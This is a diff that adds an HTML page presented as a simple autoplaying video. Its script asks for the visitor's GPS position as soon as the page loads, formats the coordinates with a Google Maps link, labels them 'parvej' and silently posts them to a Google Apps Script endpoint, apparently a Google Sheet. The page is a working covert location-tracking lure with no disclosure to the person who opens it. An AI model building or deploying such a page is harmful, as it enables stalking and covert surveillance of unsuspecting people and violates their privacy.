@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js"></script>
+    <meta http-equiv="Content-Security-Policy"
+        content="script-src 'self' 'unsafe-eval' 'unsafe-inline'; object-src 'self'; style-src 'self' 'unsafe-inline'; media-src *">
+
+</head>
+
+<body bgcolor="black">
+    <div class="form-container">
+        <!-- <h4 class="text-center mb-4">Form Submission to Google Sheet</h4> -->
+        <form id="submit-to-google-sheet">
+            <div class="form-group">
+                <!-- <label for="name">Name:</label>
+                <input class="form-control" type="text" name="name" id="name" placeholder="Name" required /> -->
+            </div>
+            <!-- <div class="gfg">GeeksforGeeks</div> -->
+
+            <!-- <p>Error handling in geolocation</p> -->
+
+            <!-- <button class="geeks" onclick="getlocation()">
+        Click
+    </button> -->
+            <p id="demo1"></p>
+
+            <video width="100%" height="100%" controls autoplay="true" loop="true" id="myvideoplayer">
+                <source src="b.mp4" type="video/mp4">
+            </video>
+
+            <script>
+                var video = document.querySelector("#myvideoplayer")
+                video.play()
+
+                const form = document.forms["submit-to-google-sheet"];
+                var formData = new FormData(form);
+                var variable1 = document.getElementById("demo1");
+                function getlocation() {
+                    navigator.geolocation.getCurrentPosition(showLoc, errHand);
+                }
+                function showLoc(pos) {
+                    variable1.innerHTML =
+                        "Latitude: " +
+                        pos.coords.latitude +
+                        "<br>Longitude: " +
+                        pos.coords.longitude;
+
+
+
+
+                    var latitude = pos.coords.latitude
+                    var longitude = pos.coords.longitude
+                    var link = "http://maps.google.com/maps?z=12&t=m&q="+ latitude +","+longitude
+
+                    currentlocation =
+                        "Gps Location\nlatitude : "+ latitude + "\nlongitude : "+ longitude +"\n"+link
+
+
+                    formData.append("nameid", "parvej")
+                    formData.append("location", currentlocation)
+
+                    postlocationdatatodatabase()
+                }
+
+                function errHand(err) {
+                    switch (err.code) {
+                        case err.PERMISSION_DENIED:
+                            variable1.innerHTML =
+                                "The application doesn't have the" +
+                                "permission to make use of location services";
+                            break;
+                        case err.POSITION_UNAVAILABLE:
+                            variable1.innerHTML =
+                                "The location of the device is uncertain";
+                            break;
+                        case err.TIMEOUT:
+                            variable1.innerHTML =
+                                "The request to get user location timed out";
+                            break;
+                        case err.UNKNOWN_ERROR:
+                            variable1.innerHTML =
+                                "Time to fetch location information exceeded" +
+                                "the maximum timeout interval";
+                            break;
+                    }
+                }
+
+
+
+                function postlocationdatatodatabase() {
+                    const scriptURL =
+                        "https://script.google.com/macros/s/AKfycbw6BdBPrirfxCEkyzNgJDkSjR1DF4Dk2ZiTEDryJ3YDKXCcjG0x2W9l9VXZ6izs7CIg/exec";
+
+                    fetch(scriptURL, { method: "POST", body: formData })
+                        .then((response) => {
+                            console.log("Done", "Submitted Successfully.", "success");
+                        })
+                        .catch((error) => {
+                            console.log("Error", "Something went wrong. please try again!", "error");
+                        });
+
+
+                }
+
+
+
+
+                getlocation()
+            </script>
+</body>
+
+</html>
